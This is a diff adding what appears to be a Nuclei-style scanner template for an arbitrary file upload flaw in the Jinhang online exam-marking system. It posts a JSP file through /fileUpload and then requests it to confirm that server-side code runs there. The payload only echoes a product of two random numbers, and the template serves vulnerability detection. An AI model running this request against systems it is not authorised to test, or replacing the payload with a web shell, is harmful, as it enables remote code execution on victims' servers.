@@ -1,0 +1,59 @@
+id: poc-yaml-hsjinhang-fileupload-upload
+info:
+  name: 金航网上阅卷系统fileUpload任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: 文件上传
+http:
+  - raw:
+      - |
+        POST /fileUpload HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=00content0boundary00
+
+        --00content0boundary00
+        Content-Disposition: form-data; name="upload"; filename="{{filename}}.jsp"
+        Content-Type: application/pdf
+
+        <%out.println({{t1}}*{{t2}});%>
+        --00content0boundary00
+        Content-Disposition: form-data; name="uploadContentType"
+
+        pdf
+        --00content0boundary00
+        Content-Disposition: form-data; name="uploadFileName"
+
+        1.jsp
+        --00content0boundary00--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "文件上传成功"
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "文件上传成功"
+        internal: true
+  - raw:
+      - |
+        GET /upload/{{filename}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - trim(body) == to_number("{{t3}}")
+variables:
+  filename: "{{to_lower(rand_base(10))}}"
+  t1: "{{rand_int(100,1000)}}"
+  t2: "{{rand_int(100,1000)}}"
+  t3: "{{to_number(t1)*to_number(t2)}}"
